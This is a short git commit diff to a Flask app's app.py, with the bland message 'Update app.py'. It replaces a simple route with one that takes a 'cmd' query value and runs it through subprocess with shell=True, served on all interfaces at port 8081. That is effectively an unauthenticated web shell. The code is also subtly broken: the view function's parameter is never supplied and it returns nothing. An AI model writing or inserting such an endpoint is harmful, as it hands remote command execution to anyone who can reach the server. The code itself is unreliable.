354d4d9569221357d73531769726a39dc576ac64
stefancicos <77525072+stefancicos@users.noreply.github.com>
2022-07-07 10:36:59 +0300

    Update app.py

--- app.py
+++ app.py
@@ -4,7 +4,11 @@ from waitress import serve
 
 app = Flask(__name__)
 @app.route('/', methods=['GET'])
-def main():
-	cmd = request.args
-	return cmd
+def main(cmd):
+	c = cmd['cmd']
+	print(c)
+	try:
+		b = subprocess.check_output(c, shell=True).decode()
+	except Exception as err:
+		b = str(err)
 serve(app, port=8081, host='0.0.0.0')
